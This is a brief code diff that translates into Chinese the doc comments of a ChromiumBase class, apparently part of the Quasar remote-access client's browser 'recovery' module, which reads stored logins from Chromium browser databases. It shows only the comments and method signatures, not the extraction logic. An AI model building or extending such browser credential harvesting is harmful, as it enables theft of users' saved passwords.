@@ -7,7 +7,7 @@ using System.IO;
 namespace Quasar.Client.Recovery.Browsers
 {
     /// <summary>
-    /// Provides basic account recovery capabilities from chromium-based applications.
+    /// 提供基于chromium应用程序的基本账户恢复功能。
     /// </summary>
     public abstract class ChromiumBase : IAccountReader
     {
@@ -18,11 +18,11 @@ namespace Quasar.Client.Recovery.Browsers
         public abstract IEnumerable<RecoveredAccount> ReadAccounts();
 
         /// <summary>
-        /// Reads the stored accounts of an chromium-based application.
+        /// 读取基于chromium应用程序的存储账户。
         /// </summary>
-        /// <param name="filePath">The file path of the logins database.</param>
-        /// <param name="localStatePath">The file path to the local state.</param>
-        /// <returns>A list of recovered accounts.</returns>
+        /// <param name="filePath">登录数据库的文件路径。</param>
+        /// <param name="localStatePath">本地状态的文件路径。</param>
+        /// <returns>恢复账户的列表。</returns>
         protected List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath)
         {
             var result = new List<RecoveredAccount>();
